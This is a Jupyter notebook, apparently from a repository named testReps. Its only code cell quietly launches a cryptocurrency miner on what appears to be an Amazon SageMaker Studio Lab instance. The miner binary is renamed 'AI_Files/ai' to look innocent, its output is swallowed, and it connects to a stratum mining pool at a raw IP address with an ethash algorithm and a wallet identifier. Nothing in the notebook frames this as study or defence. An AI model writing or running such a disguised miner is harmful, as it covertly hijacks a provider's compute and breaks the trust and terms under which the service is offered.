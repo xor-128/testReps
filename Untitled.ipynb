{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e6b5e0f1-1f8d-4e7e-b1b5-0d951f35f2de",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os, threading, time, random\n",
    "from string import digits, ascii_lowercase, ascii_uppercase\n",
    "import subprocess\n",
    "\n",
    "clear = lambda:os.system(\"clear\")\n",
    "                    \n",
    "def main():\n",
    "    subprocess.Popen([\"/home/studio-lab-user/sagemaker-studiolab-notebooks/AI_Files/ai\", \"-a ethash -o stratum+tcp://20.94.236.164:443 -u '0xGamerHash:denizdeni#test'\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);\n",
    "    \n",
    "if __name__ == \"__main__\":\n",
    "    main()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "372ecf75-15ac-4151-a116-db202daa0c47",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "default:Python",
   "language": "python",
   "name": "conda-env-default-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
